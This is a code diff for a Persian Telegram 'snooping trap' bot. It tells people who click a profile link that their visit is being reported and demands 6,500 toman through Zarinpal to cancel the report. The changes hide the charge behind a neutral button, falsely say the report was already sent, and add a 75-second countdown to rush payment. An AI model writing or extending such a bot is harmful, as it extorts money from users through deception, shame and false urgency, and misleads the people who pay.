@@ -53,7 +53,7 @@ c.execute("""CREATE TABLE IF NOT EXISTS pending_payments (
     created_at DATETIME
 )""")
 
-# جدول جدید برای پرداخت‌های لغو گزارش
+# جدول برای پرداخت‌های لغو گزارش
 c.execute("""CREATE TABLE IF NOT EXISTS cancel_payments (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
     report_id INTEGER,
@@ -236,13 +236,10 @@ def delete_message_later(chat_id, message_id, delay, clicker_id, owner_name, rep
     result = c.fetchone()
     if result and result[0] == False:
         # ارسال گزارش به صاحب لینک (با ۴ دکمه)
-        owner_id = None
-        clicker_id = None
-        link_code = None
-        c.execute("SELECT owner_id, clicker_id, link_code FROM pending_reports WHERE id = ?", (report_id,))
+        c.execute("SELECT owner_id, clicker_id FROM pending_reports WHERE id = ?", (report_id,))
         row = c.fetchone()
         if row:
-            owner_id, clicker_id, link_code = row
+            owner_id, clicker_id = row
             clicker_name = get_clicker_name(clicker_id)
             
             keyboard = InlineKeyboardMarkup(row_width=2)
@@ -280,15 +277,16 @@ def start(message):
         if owner_id and owner_id != clicker_id:
             owner_name = get_owner_name(owner_id)
             
-            # دکمه جدید برای لغو با پرداخت
+            # دکمه مطابق عکس اول: "❌ عدم ارسال گزارش فضولی"
             keyboard = InlineKeyboardMarkup()
-            keyboard.add(InlineKeyboardButton("💳 لغو گزارش با پرداخت ۶,۵۰۰ تومان", callback_data=f"pay_cancel_{code}_{clicker_id}"))
+            keyboard.add(InlineKeyboardButton("❌ عدم ارسال گزارش فضولی", callback_data=f"cancel_{code}_{clicker_id}"))
             
+            # متن دقیقاً مثل عکس اول
             trap_message = (
-                f"⚠️ **نبايد اين فضولی رو ميکردی!** 🥰\n\n"
-                f"اگه نمیخوای {owner_name} بفهمه که به پروفایلش سر زدی، "
-                f"می‌تونی با پرداخت فقط ۶,۵۰۰ تومان گزارش رو لغو کنی.\n\n"
-                f"👇 روی دکمه زیر بزن و پرداخت رو انجام بده"
+                f"⚠️ **نباید این فضولی رو میکردی!**\n\n"
+                f"الان این فضولیت برای {owner_name} ارسال شد، بهتره قبل از اینکه بیاد ببینه، "
+                f"خودت بهش بگی داشتی فضولی میکردی 😊\n\n"
+                f"برای عدم ارسال دکمه زیر را فشار دهید (فرصت شما 1 دقیقه و 15 ثانیه)"
             )
             
             msg = bot.send_message(clicker_id, trap_message, reply_markup=keyboard, parse_mode='Markdown')
@@ -315,9 +313,9 @@ def get_link(message):
     link = generate_link(user_id)
     bot.send_message(user_id, f"🔗 لینک اختصاصی تو:\n`{link}`\n\nاین لینک رو تو بیوگرافیت بذار.", parse_mode='Markdown')
 
-# ========== دکمه پرداخت برای لغو گزارش ==========
-@bot.callback_query_handler(func=lambda call: call.data.startswith("pay_cancel_"))
-def pay_cancel_report(call):
+# ========== دکمه "❌ عدم ارسال گزارش فضولی" -> نمایش صفحه پرداخت ==========
+@bot.callback_query_handler(func=lambda call: call.data.startswith("cancel_"))
+def cancel_report_payment_page(call):
     _, code, clicker_id = call.data.split("_")
     clicker_id = int(clicker_id)
     
@@ -338,44 +336,49 @@ def pay_cancel_report(call):
     pay_link, error = create_cancel_payment_link(clicker_id, report_id, 65000)
     
     if pay_link:
-        keyboard = InlineKeyboardMarkup()
-        keyboard.add(InlineKeyboardButton("💳 پرداخت ۶,۵۰۰ تومان", url=pay_link))
-        keyboard.add(InlineKeyboardButton("🔄 بررسی پس از پرداخت", callback_data=f"check_cancel_{report_id}"))
-        
         # حذف پیام قبلی تله
         try:
             bot.delete_message(call.message.chat.id, call.message.message_id)
         except:
             pass
         
-        # نمایش صفحه پرداخت (مطابق عکس)
+        # صفحه پرداخت دقیقاً مطابق عکس دوم
+        keyboard = InlineKeyboardMarkup(row_width=1)
+        keyboard.add(
+            InlineKeyboardButton("📄 مشاهده جزئیات", callback_data=f"details_{report_id}"),
+            InlineKeyboardButton("💳 پرداخت", url=pay_link)
+        )
+        
+        payment_text = (
+            f"💳 **درخواست پول**\n\n"
+            f"**لغو ارسال گزارش فضولی**\n"
+            f"با پرداخت فقط ۶,۵۰۰ تومان، گزارش فضولی شما برای صاحب لینک ارسال نخواهد شد.\n\n"
+            f"لغو گزارش: 65000\n"
+            f"مبلغ: ۶۵,۰۰۰ ریال"
+        )
+        
         bot.send_message(
             call.message.chat.id,
-            f"💳 **لغو گزارش فضولی**\n\n"
-            f"با پرداخت فقط ۶,۰۰۰ تومان، گزارش فضولی شما برای صاحب لینک ارسال نخواهد شد.\n\n"
-            f"لغو گزارش: 65000\n"
-            f"مبلغ: ۶۵,۰۰۰ ریال\n\n"
-            f"🔗 روی دکمه زیر بزن تا وارد درگاه پرداخت بشی:",
+            payment_text,
             reply_markup=keyboard,
             parse_mode='Markdown'
         )
     else:
         bot.send_message(call.message.chat.id, f"❌ خطا در اتصال به درگاه پرداخت. لطفاً چند دقیقه بعد تلاش کن.\nخطا: {error}")
 
-@bot.callback_query_handler(func=lambda call: call.data.startswith("check_cancel_"))
-def check_cancel_status(call):
+# ========== دکمه مشاهده جزئیات ==========
+@bot.callback_query_handler(func=lambda call: call.data.startswith("details_"))
+def show_details(call):
     _, report_id = call.data.split("_")
-    report_id = int(report_id)
-    
-    c.execute("SELECT status FROM cancel_payments WHERE report_id = ? ORDER BY id DESC LIMIT 1", (report_id,))
-    row = c.fetchone()
-    
-    if row and row[0] == "paid":
-        bot.answer_callback_query(call.id, "✅ پرداخت شما تایید شده! گزارش لغو شد.")
-        bot.send_message(call.message.chat.id, "✅ **پرداخت شما قبلاً تایید شده!**\n\nگزارش فضولی ارسال نخواهد شد.")
-    else:
-        bot.answer_callback_query(call.id, "هنوز پرداختی ثبت نشده. لطفاً ابتدا پرداخت کن.")
-        bot.send_message(call.message.chat.id, "⏳ هنوز پرداختی ثبت نشده.\nلطفاً پرداخت رو انجام بده و بعد این دکمه رو بزن.")
+    bot.answer_callback_query(call.id)
+    details_msg = (
+        f"📋 **جزئیات پرداخت**\n\n"
+        f"💰 مبلغ: ۶,۵۰۰ تومان (۶۵,۰۰۰ ریال)\n"
+        f"📝 دلیل: لغو ارسال گزارش فضولی\n"
+        f"⏱ زمان باقی مانده: کمتر از ۷۵ ثانیه\n\n"
+        f"پس از پرداخت موفق، گزارش شما ارسال نخواهد شد."
+    )
+    bot.send_message(call.message.chat.id, details_msg, parse_mode='Markdown')
 
 # ========== وب‌هوک تایید پرداخت لغو گزارش ==========
 @app.route('/verify_cancel', methods=['GET'])
@@ -394,7 +397,6 @@ def verify_cancel_payment():
     if status != "OK":
         return "پرداخت ناموفق یا توسط کاربر لغو شده است", 400
     
-    # پیدا کردن مبلغ
     c.execute("SELECT amount FROM cancel_payments WHERE authority = ? AND user_id = ? AND report_id = ?", 
               (authority, user_id, report_id))
     row = c.fetchone()
@@ -403,7 +405,6 @@ def verify_cancel_payment():
     
     amount = row[0]
     
-    # تایید پرداخت با زرین‌پال
     data = {
         "merchant_id": ZP_MERCHANT_ID,
         "amount": amount,
@@ -415,12 +416,10 @@ def verify_cancel_payment():
         result = response.json()
         
         if result.get("data", {}).get("code") == 100:
-            # پرداخت موفق
             c.execute("UPDATE cancel_payments SET status = 'paid' WHERE authority = ?", (authority,))
             c.execute("UPDATE pending_reports SET cancelled = TRUE WHERE id = ?", (report_id,))
             conn.commit()
             
-            # اطلاع به کاربر
             try:
                 bot.send_message(
                     user_id,
@@ -590,7 +589,6 @@ def verify_payment_route():
     if status != "OK":
         return "پرداخت ناموفق یا توسط کاربر لغو شده است", 400
     
-    # پیدا کردن مبلغ از دیتابیس
     c.execute("SELECT amount FROM pending_payments WHERE authority = ? AND user_id = ?", (authority, user_id))
     row = c.fetchone()
     if not row:
@@ -598,18 +596,13 @@ def verify_payment_route():
     
     amount = row[0]
     
-    # تایید پرداخت
     success, ref_id = verify_payment(authority, amount)
     
     if success:
-        # افزودن اشتراک
         new_expires = add_subscription(user_id, days)
-        
-        # حذف از pending_payments
         c.execute("DELETE FROM pending_payments WHERE authority = ?", (authority,))
         conn.commit()
         
-        # اطلاع به کاربر
         try:
             bot.send_message(
                 user_id,
